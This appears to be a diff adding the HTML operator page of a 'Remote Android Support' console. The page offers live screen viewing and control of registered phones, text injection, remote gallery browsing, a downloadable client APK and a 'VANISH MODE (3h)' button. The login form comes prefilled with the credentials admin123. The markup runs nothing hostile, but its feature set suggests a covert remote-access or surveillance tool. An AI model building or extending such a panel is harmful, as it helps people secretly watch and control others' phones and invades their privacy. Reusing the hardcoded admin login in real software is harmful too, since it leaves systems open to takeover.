@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Remote Support">
+  <link rel="manifest" href="/manifest.json">
+  <title>Remote Android Support — Enterprise Console</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <link rel="stylesheet" href="src/styles/main.css">
+</head>
+<body>
+
+  <!-- Auth Modal Dialog -->
+  <div id="auth-modal" class="modal-overlay hidden">
+    <div class="modal-card">
+      <div style="display: flex; justify-content: center;">
+        <div class="brand-icon" style="width: 54px; height: 54px; font-size: 26px;">🛡️</div>
+      </div>
+      <h2 class="modal-title">Administrator Sign In</h2>
+      <p class="modal-desc">Enter your credentials to access the Remote Support Console</p>
+
+      <form id="auth-form">
+        <div class="input-group">
+          <label class="input-label">Admin Email</label>
+          <input type="email" id="auth-email" value="admin@remotesupport.com" required class="input-field" placeholder="admin@remotesupport.com">
+        </div>
+        <div class="input-group">
+          <label class="input-label">Password</label>
+          <input type="password" id="auth-password" value="admin123" required class="input-field" placeholder="••••••••">
+        </div>
+
+        <div id="auth-error" class="hidden" style="color: var(--danger); font-size: 12px; margin-bottom: 16px; font-weight: 600;"></div>
+
+        <button type="submit" class="btn btn-primary" style="width: 100%; padding: 12px;">Sign In to Console</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Gallery Viewer Modal -->
+  <div id="gallery-modal" class="modal-overlay hidden">
+    <div class="modal-card" style="max-width: 720px; width: 90%; max-height: 85vh; display: flex; flex-direction: column; text-align: left; padding: 24px;">
+      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px;">
+        <div style="display: flex; align-items: center; gap: 10px;">
+          <div class="brand-icon" style="width: 36px; height: 36px; font-size: 18px;">🖼️</div>
+          <div>
+            <h3 style="font-size: 16px; font-weight: 700; color: #fff;">Device Photos & Gallery</h3>
+            <p id="gallery-modal-subtitle" style="font-size: 11px; color: var(--text-muted);">Real-time remote photo explorer</p>
+          </div>
+        </div>
+        <button id="btn-close-gallery" class="btn btn-secondary" style="padding: 6px 12px;">✕ Close</button>
+      </div>
+
+      <!-- Photo Grid Container -->
+      <div id="gallery-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px; overflow-y: auto; max-height: 60vh; padding: 8px;">
+        <div style="grid-column: 1 / -1; text-align: center; color: var(--text-muted); padding: 40px;">
+          <i data-lucide="loader" style="animation: spin 1s linear infinite; width: 28px; height: 28px;"></i>
+          <p style="margin-top: 10px; font-size: 13px;">Requesting gallery access from device...</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main App Layout -->
+  <div class="app-container">
+    
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="brand">
+        <div class="brand-icon">⚡</div>
+        <div>
+          <div class="brand-title">REMOTE SUPPORT</div>
+          <div class="brand-subtitle">Android Fleet Console</div>
+        </div>
+      </div>
+
+      <ul class="nav-list">
+        <li>
+          <button id="nav-devices" class="nav-btn active">
+            <i data-lucide="smartphone"></i> Registered Devices
+          </button>
+        </li>
+        <li>
+          <button id="nav-active-session" class="nav-btn">
+            <i data-lucide="tv"></i> Live Screen Studio
+          </button>
+        </li>
+        <li>
+          <button id="nav-history" class="nav-btn">
+            <i data-lucide="shield-check"></i> Audit History
+          </button>
+        </li>
+      </ul>
+
+      <!-- Download APK Button in Sidebar -->
+      <div style="margin-top: 16px; margin-bottom: 16px; padding: 0 4px;">
+        <a href="/api/download/app.apk" class="btn btn-download" style="width: 100%; text-decoration: none; font-size: 12px;">
+          <i data-lucide="download"></i> Download User APK
+        </a>
+      </div>
+
+      <div class="sidebar-footer">
+        <div class="user-info">
+          <span id="admin-email-badge" class="user-email">admin@remotesupport.com</span>
+          <span class="user-role">Super Admin</span>
+        </div>
+        <button id="btn-logout" class="logout-btn" title="Sign Out">
+          <i data-lucide="log-out"></i>
+        </button>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="main-content">
+      
+      <!-- View 1: Devices Dashboard -->
+      <section id="view-devices">
+        <div class="top-bar">
+          <div>
+            <h1 class="page-title">Registered Android Devices</h1>
+            <p class="page-subtitle">Real-time status of user smartphones ready for remote support</p>
+          </div>
+          <div style="display: flex; gap: 12px; align-items: center;">
+            <a href="/api/download/app.apk" class="btn btn-download" style="text-decoration: none;">
+              <i data-lucide="download"></i> Download User APK (.apk)
+            </a>
+            <button id="btn-refresh-devices" class="btn btn-secondary">
+              <i data-lucide="rotate-cw"></i> Refresh Devices
+            </button>
+          </div>
+        </div>
+
+        <div id="devices-grid" class="devices-grid">
+          <!-- Rendered dynamically -->
+        </div>
+      </section>
+
+      <!-- View 2: Live Studio (View & Control) -->
+      <section id="view-studio" class="hidden">
+        <div class="top-bar">
+          <div style="display: flex; align-items: center; gap: 16px;">
+            <button id="btn-back-devices" class="btn btn-secondary" style="padding: 10px;">
+              <i data-lucide="arrow-left"></i>
+            </button>
+            <div>
+              <div style="display: flex; align-items: center; gap: 12px;">
+                <h1 id="studio-device-name" class="page-title">Galaxy A15</h1>
+                <span id="studio-screen-status" class="status-pill status-screen-on">🟢 Screen ON</span>
+              </div>
+              <p id="studio-support-code" class="page-subtitle">Code: 8A4B-9B0D • Android 14</p>
+            </div>
+          </div>
+
+          <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+            <button id="btn-mode-view" class="btn btn-secondary">VIEW ONLY</button>
+            <button id="btn-mode-control" class="btn btn-primary">CONTROL MODE</button>
+            <button id="btn-open-gallery" class="btn btn-secondary" style="background: rgba(16, 185, 129, 0.15); color: #34d399; border-color: rgba(16, 185, 129, 0.3);">
+              🖼️ VIEW GALLERY
+            </button>
+            <button id="btn-vanish" class="btn btn-vanish">👻 VANISH MODE (3h)</button>
+            <button id="btn-end-session" class="btn btn-danger">END SESSION</button>
+          </div>
+        </div>
+
+        <!-- Studio Grid Layout -->
+        <div class="studio-layout">
+          <!-- Center Phone Viewport -->
+          <div class="viewport-card">
+            <div class="phone-mockup">
+              <div class="phone-notch"></div>
+              <canvas id="live-canvas" width="720" height="1560"></canvas>
+            </div>
+          </div>
+
+          <!-- Side Controls -->
+          <div>
+            <!-- Hardware Navigation -->
+            <div class="panel-card">
+              <div class="panel-title">
+                <i data-lucide="gamepad-2" style="color: var(--primary);"></i> Hardware Navigation
+              </div>
+              <div class="nav-keys-grid">
+                <button id="btn-key-back" class="key-btn">◀ BACK</button>
+                <button id="btn-key-home" class="key-btn">● HOME</button>
+                <button id="btn-key-recents" class="key-btn">■ RECENTS</button>
+              </div>
+            </div>
+
+            <!-- Direct Text Injection -->
+            <div class="panel-card">
+              <div class="panel-title">
+                <i data-lucide="keyboard" style="color: var(--accent);"></i> Text Injection
+              </div>
+              <div style="display: flex; flex-direction: column; gap: 10px;">
+                <input type="text" id="remote-text-input" placeholder="Type text to send to phone..." class="input-field">
+                <button id="btn-send-text" class="btn btn-primary" style="width: 100%;">
+                  Inject Text into Device
+                </button>
+              </div>
+            </div>
+
+            <!-- Streaming Mode -->
+            <div class="panel-card">
+              <div class="panel-title">
+                <i data-lucide="sliders" style="color: var(--success);"></i> Stream Optimization
+              </div>
+              <select id="quality-selector" class="input-field">
+                <option value="PERFORMANCE">⚡ Performance (720p / 30 FPS)</option>
+                <option value="BALANCED" selected>⚖️ Balanced (540p / 20 FPS)</option>
+                <option value="LITE">🍃 Lite Mode (360p / Budget Phone)</option>
+              </select>
+            </div>
+
+          </div>
+        </div>
+      </section>
+
+      <!-- View 3: Audit History -->
+      <section id="view-history" class="hidden">
+        <div class="top-bar">
+          <div>
+            <h1 class="page-title">Audit History</h1>
+            <p class="page-subtitle">Tamper-evident record of all remote diagnostic sessions</p>
+          </div>
+          <button id="btn-refresh-history" class="btn btn-secondary">
+            <i data-lucide="rotate-cw"></i> Refresh Log
+          </button>
+        </div>
+
+        <div class="panel-card">
+          <div id="audit-timeline" style="display: flex; flex-direction: column;">
+            <!-- Rendered dynamically -->
+          </div>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <script src="src/app.js"></script>
+</body>
+</html>
